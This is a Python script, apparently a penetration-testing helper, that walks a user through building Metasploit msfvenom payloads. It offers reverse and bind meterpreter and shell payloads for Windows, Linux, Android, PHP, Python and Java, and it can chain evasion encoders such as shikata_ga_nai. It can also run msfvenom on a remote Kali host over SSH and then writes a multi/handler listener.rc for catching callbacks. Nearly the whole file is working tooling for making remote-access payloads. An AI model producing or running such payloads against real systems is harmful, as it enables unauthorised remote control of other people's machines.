#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MSFVenom Payload Generator (interactive CLI)
Python script that automates Metasploit payload generation and handler configuration.
"""

import os
import sys
import subprocess
import json
from typing import Dict, List, Optional

class MSFPayloadGenerator:
    def __init__(self):
        self.payload_config = {
            'platform': '',
            'arch': '',
            'payload_type': '',
            'lhost': '',
            'lport': '',
            'output_format': '',
            'output_file': '',
            'encoder': '',
            'iterations': 1
        }
        
    def check_msfvenom(self) -> bool:
        """Check if msfvenom is available"""
        print("Checking msfvenom installation...")
        
        # 檢查 Kali Linux 上是否有 msfvenom
        try:
            # 在 Linux 上使用 which 命令查找 msfvenom
            result = subprocess.run(['which', 'msfvenom'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                msfvenom_path = result.stdout.strip()
                print(f"Found msfvenom: {msfvenom_path}")
                
                # 檢查 msfvenom 是否可執行 (使用 --help 而不是 --version)
                # 注意：msfvenom --help 的返回碼可能不是 0，但這不代表命令失敗
                help_result = subprocess.run(['msfvenom', '--help'],
                                           capture_output=True, text=True, timeout=10)
                
                # 只要命令有輸出就認為成功（msfvenom --help 總是會有輸出）
                if help_result.stdout or help_result.stderr:
                    # 從幫助訊息中提取版本資訊
                    if help_result.stdout:
                        first_line = help_result.stdout.split('\n')[0]
                        print(first_line.strip())
                    else:
                        print("msfvenom help output")
                    return True
                else:
                    print("msfvenom failed to run: no output")
                    return False
            else:
                print("msfvenom not found")
                return False
                
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f"Detection failed: {e}")
            return False
    
    def get_user_input(self) -> None:
        """Collect configuration via interactive prompts"""
        print("MSFVenom Payload Generator")
        print("=" * 50)
        
        # 平台選擇
        platforms = ['windows', 'linux', 'android', 'macos', 'php', 'python']
        print("\nSelect target platform:")
        for i, platform in enumerate(platforms, 1):
            print(f"{i}. {platform}")
        
        platform_choice = self.get_choice_input("Enter platform number: ", len(platforms))
        self.payload_config['platform'] = platforms[platform_choice - 1]
        
        # 架構選擇
        if self.payload_config['platform'] in ['windows', 'linux']:
            archs = ['x86', 'x64']
            print("\nSelect architecture:")
            for i, arch in enumerate(archs, 1):
                print(f"{i}. {arch}")
            arch_choice = self.get_choice_input("Enter architecture number: ", len(archs))
            self.payload_config['arch'] = archs[arch_choice - 1]
        else:
            self.payload_config['arch'] = ''
        
        # Payload 類型選擇
        payload_types = [
            # Meterpreter payloads
            'meterpreter/reverse_tcp', 'meterpreter/bind_tcp',
            'meterpreter/reverse_http', 'meterpreter/reverse_https',
            'meterpreter/reverse_tcp_ssl', 'meterpreter/reverse_winhttp',
            'meterpreter/reverse_winhttps',
            
            # Shell payloads
            'shell/reverse_tcp', 'shell/bind_tcp',
            'shell/reverse_http', 'shell/reverse_https',
            'shell/reverse_tcp_ssl',
            
            # Stageless payloads
            'meterpreter_reverse_tcp', 'meterpreter_bind_tcp',
            'meterpreter_reverse_http', 'meterpreter_reverse_https',
            
            # Linux specific
            'linux/x86/meterpreter/reverse_tcp', 'linux/x64/meterpreter/reverse_tcp',
            'linux/x86/shell/reverse_tcp', 'linux/x64/shell/reverse_tcp',
            
            # Windows specific
            'windows/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp',
            'windows/shell/reverse_tcp', 'windows/x64/shell/reverse_tcp',
            'windows/meterpreter/reverse_tcp_uuid',
            
            # Android
            'android/meterpreter/reverse_tcp', 'android/meterpreter/reverse_http',
            'android/meterpreter/reverse_https',
            
            # PHP
            'php/meterpreter/reverse_tcp', 'php/meterpreter_reverse_tcp',
            'php/shell/reverse_tcp',
            
            # Python
            'python/meterpreter/reverse_tcp', 'python/shell/reverse_tcp',
            
            # Java
            'java/meterpreter/reverse_tcp', 'java/shell/reverse_tcp',
            
            # HTTPS payloads
            'windows/meterpreter/reverse_https', 'windows/x64/meterpreter/reverse_https',
            'linux/x64/meterpreter/reverse_https'
        ]
        
        print("\nSelect payload type:")
        print("=" * 50)
        
        categories_order = [
            ("Platform specific", [p for p in payload_types if p.startswith(('linux', 'windows', 'android', 'php', 'python', 'java'))]),
            ("Meterpreter TCP", [p for p in payload_types if 'meterpreter' in p and ('tcp' in p and 'http' not in p and 'https' not in p)]),
            ("Meterpreter HTTP/S", [p for p in payload_types if 'meterpreter' in p and ('http' in p or 'https' in p)]),
            ("Shell TCP", [p for p in payload_types if 'shell' in p and ('tcp' in p and 'http' not in p and 'https' not in p)]),
            ("Stageless", [p for p in payload_types if '_' in p])
        ]

        seen = set()
        all_payloads = []
        for category, payloads in categories_order:
            print(f"\n{category}:")
            print("-" * 30)
            displayed = False
            for ptype in payloads:
                if ptype not in seen:
                    print(f"{len(all_payloads) + 1}. {ptype}")
                    all_payloads.append(ptype)
                    seen.add(ptype)
                    displayed = True
            if not displayed:
                print("(none)")
        
        payload_choice = self.get_choice_input("\nEnter payload type number: ", len(all_payloads))
        self.payload_config['payload_type'] = all_payloads[payload_choice - 1]
        
        # 連接參數
        self.payload_config['lhost'] = input("\nEnter listener host (LHOST): ").strip()
        self.payload_config['lport'] = input("Enter listener port (LPORT): ").strip()
        
        # 輸出格式
        formats = {
            'windows': ['exe', 'dll', 'psh'],
            'linux': ['elf', 'so'],
            'android': ['apk'],
            'php': ['php'],
            'python': ['py'],
            'macos': ['macho']
        }
        
        platform_format = formats.get(self.payload_config['platform'], ['raw'])
        print(f"\nSelect output format ({self.payload_config['platform']}):")
        for i, fmt in enumerate(platform_format, 1):
            print(f"{i}. {fmt}")
        format_choice = self.get_choice_input("Enter format number: ", len(platform_format))
        self.payload_config['output_format'] = platform_format[format_choice - 1]
        
        # 輸出檔案
        default_file = f"payload.{self.payload_config['output_format']}"
        output_file = input(f"Output file name (default: {default_file}): ").strip()
        self.payload_config['output_file'] = output_file if output_file else default_file
        
        encoders = [
            'None',
            'x86/shikata_ga_nai', 'x86/alpha_mixed', 'x86/alpha_upper',
            'x86/avoid_utf8_tolower', 'x86/call4_dword_xor', 'x86/context_cpuid',
            'x86/context_stat', 'x86/context_time', 'x86/countdown', 'x86/fnstenv_mov',
            'x86/jmp_call_additive', 'x86/nonalpha', 'x86/nonupper', 'x86/opt_sub',
            'x86/service', 'x86/single_static_bit', 'x86/unicode_mixed', 'x86/unicode_upper', 'x86/xor',
            'x64/xor', 'x64/xor_dynamic', 'x64/zutto_dekiru',
            'ppc/longxor', 'sparc/longxor_tag', 'mipsbe/longxor', 'mipsle/longxor',
            'cmd/powershell_base64', 'php/base64',
            'generic/eicar', 'generic/none', 'x86/opty2',
            'x86/shikata_ga_nai + x86/alpha_upper', 'x86/shikata_ga_nai + x86/xor', 'x86/shikata_ga_nai + x64/xor'
        ]

        print("\nSelect encoder:")
        print("=" * 50)

        target_arch = self.payload_config.get('arch')

        def is_compatible(enc: str) -> bool:
            if not target_arch or target_arch not in ('x86', 'x64'):
                return True
            parts = [p.strip() for p in enc.split('+')]
            for p in parts:
                if p.startswith('x86/') and target_arch != 'x86':
                    return False
                if p.startswith('x64/') and target_arch != 'x64':
                    return False
                if p.startswith(('ppc/', 'sparc/', 'mipsbe/', 'mipsle/')):
                    return False
            return True

        compatible_list = [e for e in encoders if e != 'None' and is_compatible(e)]
        incompatible_list = [e for e in encoders if e != 'None' and e not in compatible_list]

        all_encoders = ['None']
        if compatible_list:
            print("\nRecommended (compatible with target architecture):")
            print("-" * 30)
            for i, e in enumerate(compatible_list, len(all_encoders) + 1):
                print(f"{i}. {e}")
                all_encoders.append(e)

        encoder_categories = {
            "x86 encoders": [e for e in incompatible_list if e.startswith('x86/')],
            "x64 encoders": [e for e in incompatible_list if e.startswith('x64/')],
            "Other architectures": [e for e in incompatible_list if e.startswith(('ppc/', 'sparc/', 'mips', 'cmd/', 'php/'))],
            "Advanced encoders": [e for e in incompatible_list if e.startswith('generic/') or 'opty2' in e],
            "Chained encoders": [e for e in incompatible_list if '+' in e]
        }

        for category, encoder_list in encoder_categories.items():
            print(f"\n{category}:")
            print("-" * 30)
            displayed = False
            for e in encoder_list:
                print(f"{len(all_encoders) + 1}. {e}")
                all_encoders.append(e)
                displayed = True
            if not displayed:
                print("(none)")

        encoder_choice = self.get_choice_input("\nEnter encoder number: ", len(all_encoders))
        
        if encoder_choice > 1:
            selected_encoder = all_encoders[encoder_choice - 1]
            if not is_compatible(selected_encoder):
                print(f"Encoder is incompatible with target architecture: {selected_encoder} → {target_arch}")
                proceed = input("Continue with incompatible encoder? (y/n): ").strip().lower()
                if proceed != 'y':
                    if compatible_list:
                        print("\nSelect a recommended encoder:")
                        for i, e in enumerate(compatible_list, 1):
                            print(f"{i}. {e}")
                        re_choice = self.get_choice_input("Encoder number: ", len(compatible_list))
                        selected_encoder = compatible_list[re_choice - 1]
                    else:
                        print("No compatible encoders available; proceeding without encoder")
                        selected_encoder = ''
            self.payload_config['encoder'] = selected_encoder
            if selected_encoder:
                if '+' in selected_encoder:
                    iterations = input("Iterations per encoder (default: 1): ").strip()
                    self.payload_config['iterations'] = int(iterations) if iterations.isdigit() else 1
                    print(f"Using chained encoders: {selected_encoder}")
                else:
                    iterations = input("Encoder iterations (default: 1): ").strip()
                    self.payload_config['iterations'] = int(iterations) if iterations.isdigit() else 1
    
    def get_choice_input(self, prompt: str, max_choice: int) -> int:
        """Get numbered user input"""
        while True:
            try:
                choice = int(input(prompt))
                if 1 <= choice <= max_choice:
                    return choice
                print(f"Enter a number between 1 and {max_choice}")
            except ValueError:
                print("Enter a valid number")
    
    def generate_payload(self) -> bool:
        """Generate payload"""
        try:
            # 構建 msfvenom 命令
            cmd = ['msfvenom']
            
            if self.payload_config['arch']:
                platform_spec = f"{self.payload_config['platform']}/{self.payload_config['arch']}"
            else:
                platform_spec = self.payload_config['platform']

            ptype = self.payload_config['payload_type']
            platform_prefixes = (
                'windows/', 'linux/', 'android/', 'php/', 'python/', 'java/', 'osx/', 'macos/'
            )
            if any(ptype.startswith(prefix) for prefix in platform_prefixes):
                payload_name = ptype
            else:
                payload_name = f"{platform_spec}/{ptype}"
            cmd.extend(['-p', payload_name])
            
            # 添加連接參數
            cmd.extend(['LHOST=' + self.payload_config['lhost']])
            cmd.extend(['LPORT=' + self.payload_config['lport']])
            
            # 添加輸出格式和檔案
            cmd.extend(['-f', self.payload_config['output_format']])
            cmd.extend(['-o', self.payload_config['output_file']])
            
            # 添加編碼器
            if self.payload_config.get('encoder'):
                cmd.extend(['-e', self.payload_config['encoder']])
                cmd.extend(['-i', str(self.payload_config['iterations'])])
            
            print(f"\nGenerate command: {' '.join(cmd)}")
            
            # 檢查是否需要通過 SSH 執行遠端命令
            use_ssh = input("Run on remote Kali server over SSH? (y/n): ").strip().lower()
            
            if use_ssh == 'y':
                # 獲取 SSH 連接資訊
                ssh_host = input("Enter Kali server IP or hostname: ").strip()
                ssh_user = input("Enter SSH username: ").strip()
                
                # 構建 SSH 命令
                ssh_cmd = ['ssh', f"{ssh_user}@{ssh_host}", ' '.join(cmd)]
                print(f"Remote command: {' '.join(ssh_cmd)}")
                
                # 執行 SSH 命令
                result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=180)
                
                # 從遠端下載生成的檔案
                if result.returncode == 0:
                    scp_cmd = ['scp', f"{ssh_user}@{ssh_host}:{self.payload_config['output_file']}", "."]
                    print(f"Download file: {' '.join(scp_cmd)}")
                    dl_result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
                    
                    if dl_result.returncode == 0:
                        print(f"Payload generated: {self.payload_config['output_file']}")
                        print(f"File size: {os.path.getsize(self.payload_config['output_file'])} bytes")
                        return True
                    else:
                        print(f"File download failed:")
                        print(dl_result.stderr)
                        return False
                else:
                    print(f"Remote execution failed:")
                    print(result.stderr)
                    return False
            else:
                # 本地執行
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                
                if result.returncode == 0:
                    print(f"Payload generated: {self.payload_config['output_file']}")
                    print(f"File size: {os.path.getsize(self.payload_config['output_file'])} bytes")
                    return True
                else:
                    print(f"Payload generation failed:")
                    print(result.stderr)
                    return False
                
        except subprocess.TimeoutExpired:
            print("Command timed out")
            return False
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def generate_listener_config(self) -> None:
        """Generate Metasploit listener configuration"""
        if self.payload_config['arch']:
            platform_spec = f"{self.payload_config['platform']}/{self.payload_config['arch']}"
        else:
            platform_spec = self.payload_config['platform']

        ptype = self.payload_config['payload_type']
        platform_prefixes = (
            'windows/', 'linux/', 'android/', 'php/', 'python/', 'java/', 'osx/', 'macos/'
        )
        if any(ptype.startswith(prefix) for prefix in platform_prefixes):
            payload_name = ptype
        else:
            payload_name = f"{platform_spec}/{ptype}"

        config_content = "use exploit/multi/handler\n"
        config_content += f"set PAYLOAD {payload_name}\n"
        
        config_content += f"""set LHOST {self.payload_config['lhost']}
set LPORT {self.payload_config['lport']}
set ExitOnSession false
exploit -j -z
"""
        
        listener_file = "listener.rc"
        with open(listener_file, 'w', encoding='utf-8') as f:
            f.write(config_content)
        
        print(f"Listener configuration generated: {listener_file}")
        print("\nUsage:")
        print(f"msfconsole -r {listener_file}")
        print("or")
        print(f"msf6 > resource {listener_file}")
    
    def run(self) -> None:
        """Main entry point"""
        if not self.check_msfvenom():
            print("msfvenom not found. Ensure Metasploit is installed and in PATH")
            sys.exit(1)
        
        self.get_user_input()
        
        print("\n" + "=" * 50)
        print("Configuration summary:")
        for key, value in self.payload_config.items():
            print(f"  {key}: {value}")
        
        confirm = input("\nProceed to generate? (y/n): ").strip().lower()
        if confirm != 'y':
            print("Operation canceled")
            return
        
        if self.generate_payload():
            self.generate_listener_config()
            
            print("\nAll tasks completed.")
            print(f"Payload file: {self.payload_config['output_file']}")
            print(f"Listener config: listener.rc")


def main():
    """Main function"""
    generator = MSFPayloadGenerator()
    generator.run()

if __name__ == "__main__":
    main()
